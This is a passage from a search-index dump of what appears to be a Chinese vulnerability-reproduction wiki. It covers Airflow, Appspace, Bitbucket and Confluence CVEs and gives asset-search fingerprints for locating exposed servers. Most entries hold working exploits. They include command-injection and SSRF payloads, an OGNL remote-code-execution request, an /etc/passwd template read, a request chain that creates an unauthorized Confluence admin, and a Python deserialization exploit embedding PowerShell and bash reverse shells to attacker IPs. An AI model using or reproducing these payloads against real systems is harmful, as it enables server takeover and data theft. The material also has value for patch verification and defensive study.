","date":"0001-01-01","objectID":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/:1:0","tags":null,"title":"","uri":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/"},{"categories":null,"content":"漏洞影响 Airflow \u003c 2.4.0 ","date":"0001-01-01","objectID":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/:2:0","tags":null,"title":"","uri":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/"},{"categories":null,"content":"网络测绘 app=\"APACHE-Airflow\" ","date":"0001-01-01","objectID":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/:3:0","tags":null,"title":"","uri":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/"},{"categories":null,"content":"漏洞复现 登录 Airflow，在任意 DAG 行，点击 Actions 列的三角符号，再点击“Trigger DAG w/ config”。 进入配置，在 Run id (Optional) 处输入 Payload： {\"lab\":\"\\\";curl `uname`.****.dnslog.pw;\\\"\"} 在 DNSLog 查看回显。 ","date":"0001-01-01","objectID":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/:4:0","tags":null,"title":"","uri":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/"},{"categories":null,"content":"修复建议 官方已发布版本 2.4.3，可升级 Apache Airflow 版本到 2.4.0 或以上，或者停用默认 Dags。 ","date":"0001-01-01","objectID":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/:5:0","tags":null,"title":"","uri":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/"},{"categories":null,"content":"Appspace jsonprequest SSRF漏洞 CVE-2021-27670 ","date":"0001-01-01","objectID":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/:0:0","tags":null,"title":"","uri":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/"},{"categories":null,"content":"漏洞描述 Appspace 6.2.4存在漏洞，允许通过api/v1/core/proxy/jsonprequest接口来进行服务端请求伪造，危害系统安全。 ","date":"0001-01-01","objectID":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/:1:0","tags":null,"title":"","uri":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/"},{"categories":null,"content":"漏洞影响 Appspace 6.2.4 ","date":"0001-01-01","objectID":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/:2:0","tags":null,"title":"","uri":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/"},{"categories":null,"content":"网络测绘 \"Sign-in-to-Appspace-Core\" ","date":"0001-01-01","objectID":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/:3:0","tags":null,"title":"","uri":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/"},{"categories":null,"content":"漏洞复现 登录页面为 验证POC /api/v1/core/proxy/jsonprequest?objresponse=false\u0026websiteproxy=true\u0026escapestring=false\u0026url=http://db0bx.2lfmar.yourdomain.xyz ","date":"0001-01-01","objectID":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/:4:0","tags":null,"title":"","uri":"/appspace-jsonprequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-27670/"},{"categories":null,"content":"Atlassian Bitbucket archive 远程命令执行漏洞 CVE-2022-36804 ","date":"0001-01-01","objectID":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/:0:0","tags":null,"title":"","uri":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/"},{"categories":null,"content":"漏洞描述 Atlassian 发布安全公告，披露了 Bitbucket Server 和 Data Center 在 7.0.0 版中引入了一个严重安全漏洞。 Bitbucket 是 Atlassian 公司提供的一个基于 web 的版本库托管服务，支持 Mercurial 和 Git 版本控制系统。支持私有化部署，根据国内某资产测绘平台数据显示，近一年全球有超过 1w+ 相关服务对外开放。 官方漏洞公告中描述 Bitbucket Server 和 Data Center 多个 API 端点存在命令注入漏洞，漏洞触发条件是攻击者具备公开项目的访问权限或者私有项目的可读权限，影响版本从 7.0 到 8.3 ","date":"0001-01-01","objectID":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/:1:0","tags":null,"title":"","uri":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/"},{"categories":null,"content":"漏洞影响 Atlassian Bitbucket 7.0～8.3 ","date":"0001-01-01","objectID":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/:2:0","tags":null,"title":"","uri":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-Bitbucket\" ","date":"0001-01-01","objectID":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/:3:0","tags":null,"title":"","uri":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /rest/api/latest/projects/BIZEE/repos/bizee-communication-api/archive?filename=wN3Am\u0026at=wN3Am\u0026path=wN3Am\u0026prefix=ax%00--exec=%60id%60%00--remote=origin ","date":"0001-01-01","objectID":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/:4:0","tags":null,"title":"","uri":"/atlassian-bitbucket-archive-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-36804/"},{"categories":null,"content":"Atlassian Bitbucket Data Center 远程代码执行漏洞 CVE-2022-26133 ","date":"0001-01-01","objectID":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/:0:0","tags":null,"title":"","uri":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/"},{"categories":null,"content":"漏洞描述 Atlassian Bitbucket Data Center 存在远程代码执行漏洞。该漏洞是由于Atlassian Bitbucket Data Center 中的 Hazelcast 接口功能未对用户数据进行有效过滤，导致存在反序列化漏洞而引起的。攻击者利用该漏洞可以构造恶意数据远程执行任意代码。只有当 Atlassian Bitbucket Data Center 以 Cluster 模式安装时，才可能受该漏洞影响。 ","date":"0001-01-01","objectID":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/:1:0","tags":null,"title":"","uri":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/"},{"categories":null,"content":"漏洞影响 Atlassian Bitbucket Data Center \u003e= 5.14.x Atlassian Bitbucket Data Center 6.x Atlassian Bitbucket Data Center \u003c 7.6.14 Atlassian Bitbucket Data Center \u003c 7.16.x Atlassian Bitbucket Data Center \u003c 7.17.6 Atlassian Bitbucket Data Center \u003c 7.18.4 Atlassian Bitbucket Data Center \u003c 7.19.4 Atlassian Bitbucket Data Center 7.20.0 ","date":"0001-01-01","objectID":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/:2:0","tags":null,"title":"","uri":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-Bitbucket\" ","date":"0001-01-01","objectID":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/:3:0","tags":null,"title":"","uri":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/"},{"categories":null,"content":"漏洞复现 exp： python3 CVE-2022-26133.py -u http://192.168.110.136:7990 -f target.txt #!/usr/bin/env python3 ## -*- coding: utf_8 -*- ## @Time : 2022/5/7 0007 9:58 from urllib.parse import urlparse import argparse import requests import logging import socket import time requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) ''' Atlassian Bitbucket Data Center反序列化漏洞(CVE-2022-26133) ## Windows Reverse Shell(未免杀) command: powershell -nop -c \\\"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\" ## Linux Reverse Shell command: bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i} ''' class CVE_2022_26133: def __init__(self, target): parse = urlparse(target) self.url = parse.scheme + \"://\" + parse.netloc self.log_init() self.timeout = 3 self.proxies = None ## self.proxies = {\"http\": \"http://127.0.0.1:8888\", \"https\": \"http://127.0.0.1:8888\"} def log_init(self): LOG_FORMAT = \"%(asctime)s - %(levelname)s - %(message)s\" logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT) def str_to_hex(self, param): ll = [] for i in param: ll.append(hex(ord(i)).split(\"x\")[1]) return \"\".join(ll) def dec_to_hex(self, param, n): if n == 4: return '{:04x}'.format(param) elif n == 8: return '{:08x}'.format(param) def get_socket_connect(self): try: parse = urlparse(self.url) target = parse.netloc.split(\":\")[0] ## default port port = 5701 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) socket.setdefaulttimeout(self.timeout) sock.connect((target, port)) return sock except Exception as msg: logging.critical(\"target is not reachable, \" + str(msg)) def generate_payload(self, cluster, command): payload = cluster.hex() payload += \"FFFFFF9C\" ## yso cb1 payload payload += \"ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B7870000000027372002B6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F72E3A188EA7322A4480200024C000A636F6D70617261746F7271007E00014C000870726F70657274797400124C6A6176612F6C616E672F537472696E673B78707372003F6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707400106F757470757450726F706572746965737704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00044C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E00200007870\" payload += self.dec_to_hex((1684 + len(command)), 8) payload += \"CAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F7","date":"0001-01-01","objectID":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/:4:0","tags":null,"title":"","uri":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/"},{"categories":null,"content":"漏洞修复 当前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本。链接如下：https://www.atlassian.com/software/bitbucket/download-archives ","date":"0001-01-01","objectID":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/:5:0","tags":null,"title":"","uri":"/atlassian-bitbucket-data-center-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-26133/"},{"categories":null,"content":"Atlassian Bitbucket 登录绕过漏洞 ","date":"0001-01-01","objectID":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 此错误已修复并部署在 Bitbucket Server \u003e 4.8 上。Bitbucket 由 Atlassian 团队开发。其中出现了一个通过 %20 绕过权限的漏洞，导致任意用户可获取敏感数据 ","date":"0001-01-01","objectID":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Bitbucket Server \u003e 4.8 ","date":"0001-01-01","objectID":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Log in - Bitbucket\" ","date":"0001-01-01","objectID":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /admin%20/mail-server /admin%20/db /admin%20/db/edit /admin%20/license /admin%20/logging /admin%20/server-settings /admin%20/authentication /admin%20/avatars ","date":"0001-01-01","objectID":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/atlassian-bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Atlassian Confluence doenterpagevariables.action 远程命令执行漏洞 CVE-2021-26084 ","date":"0001-01-01","objectID":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/:0:0","tags":null,"title":"","uri":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/"},{"categories":null,"content":"漏洞描述 Atlassian Confluence 存在远程代码执行漏洞，攻击者在无需认证，即可构造恶意请求，造成OGNL表达式注入，从而执行任意代码，控制服务器。 ","date":"0001-01-01","objectID":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/:1:0","tags":null,"title":"","uri":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/"},{"categories":null,"content":"漏洞影响 Atlassian Atlassian Confluence \u003c 7.4.11 Atlassian Atlassian Confluence \u003c 7.11.6 Atlassian Atlassian Confluence \u003c 7.13.0 Atlassian Atlassian Confluence \u003c 6.13.23 Atlassian Atlassian Confluence \u003c 7.12.5 ","date":"0001-01-01","objectID":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/:2:0","tags":null,"title":"","uri":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-Confluence\" ","date":"0001-01-01","objectID":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/:3:0","tags":null,"title":"","uri":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/"},{"categories":null,"content":"漏洞复现 登录页面 发送请求包 ![1](C:/Users/47236/Desktop/1.png)POST /pages/doenterpagevariables.action HTTP/1.1 Host: Connection: keep-alive Content-Length: 599 Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: JSESSIONID=3E654B6F4ADDF325CA2203596BD0115C cmd: id queryString=%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName%28%5Cu0022javax.script.ScriptEngineManager%5Cu0022%29.newInstance%28%29.getEngineByName%28%5Cu0022js%5Cu0022%29.eval%28%5Cu0022var+c%3Dcom.atlassian.core.filters.ServletContextThreadLocal.getRequest%28%29.getHeader%28%5Cu0027cmd%5Cu0027%29%3Bvar+x%3Djava.lang.Runtime.getRuntime%28%29.exec%28c%29%3Bvar+out%3Dcom.atlassian.core.filters.ServletContextThreadLocal.getResponse%28%29.getOutputStream%28%29%3Borg.apache.commons.io.IOUtils.copy%28x.getInputStream%28%29%2Cout%29%3Bout.flush%28%29%3B%5Cu0022%29%7D%2B%5Cu0027 ","date":"0001-01-01","objectID":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/:4:0","tags":null,"title":"","uri":"/atlassian-confluence-doenterpagevariables.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26084/"},{"categories":null,"content":"Atlassian Confluence preview SSTI模版注入漏洞 CVE-2019-3396 ","date":"0001-01-01","objectID":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/:0:0","tags":null,"title":"","uri":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/"},{"categories":null,"content":"漏洞描述 Confluence是一个专业的企业知识管理与协同软件，常用于构建企业wiki。 利用该漏洞可以读取服务器上任意文件，进而可以包含恶意文件来执行代码。可能造成敏感信息泄露，服务器被控制等严重后果。 ","date":"0001-01-01","objectID":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/:1:0","tags":null,"title":"","uri":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/"},{"categories":null,"content":"漏洞影响 Atlassian Atlassian Confluence \u003c 6.6.12 Atlassian Atlassian Confluence 6.7.0-6.12.2 Atlassian Atlassian Confluence \u003c 6.13.3 Atlassian Atlassian Confluence \u003c 6.14.2 ","date":"0001-01-01","objectID":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/:2:0","tags":null,"title":"","uri":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-Confluence\" ","date":"0001-01-01","objectID":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/:3:0","tags":null,"title":"","uri":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/"},{"categories":null,"content":"漏洞复现 登录页面 发送请求包 POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3670.0 Safari/537.36 Content-Type: application/json; charset=utf-8 Content-Length: 168 {\"contentId\":\"786457\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc5\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"file:///etc/passwd\"}}} ","date":"0001-01-01","objectID":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/:4:0","tags":null,"title":"","uri":"/atlassian-confluence-preview-ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2019-3396/"},{"categories":null,"content":"Atlassian Confluence server-info.action 登陆绕过漏洞 CVE-2023-22515 ","date":"0001-01-01","objectID":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/:0:0","tags":null,"title":"","uri":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/"},{"categories":null,"content":"漏洞描述 Atlassian Confluence 是 Atlassian 开发的一款建基于网络企业维基 (collaboration software) 的软件。 Atlassian Confluence 数据中心和服务器存在漏洞，利用 /server-info.action 端点传递 bootstrapStatusProvider.applicationConfig.setupComplete 参数，使服务器处于安装未完成状态，以访问受限制的端点并创建未经授权的 Confluence 管理员帐户，登录 Confluence 实例后台。 ","date":"0001-01-01","objectID":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/:1:0","tags":null,"title":"","uri":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/"},{"categories":null,"content":"漏洞影响 Atlassian Confluence ","date":"0001-01-01","objectID":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/:2:0","tags":null,"title":"","uri":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-Confluence\" title==\"登录 - Confluence\" ","date":"0001-01-01","objectID":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/:3:0","tags":null,"title":"","uri":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/"},{"categories":null,"content":"漏洞复现 登录页面 poc GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1 Host: Accept: */* Content-Type: application/x-www-form-urlencoded X-Atlassian-Token: no-check Accept-Encoding: gzip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 POST /setup/setupadministrator.action HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded X-Atlassian-Token: no-check Accept-Encoding: gzip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Accept: */* Content-Length: 126 username=bbvpe4mk\u0026fullName=bbvpe4mk\u0026email=bbvpe4mk@localhost\u0026password=6wg6pm6sP123\u0026confirm=6wg6pm6sP123\u0026setup-next-button=Next GET /setup/finishsetup.action HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded X-Atlassian-Token: no-check Accept-Encoding: gzip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Accept: */* ","date":"0001-01-01","objectID":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/:4:0","tags":null,"title":"","uri":"/atlassian-confluence-server-info.action-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22515/"},{"categories":null,"content":"Atlassian Confluence 敏感信息泄露 CVE-2021-26085 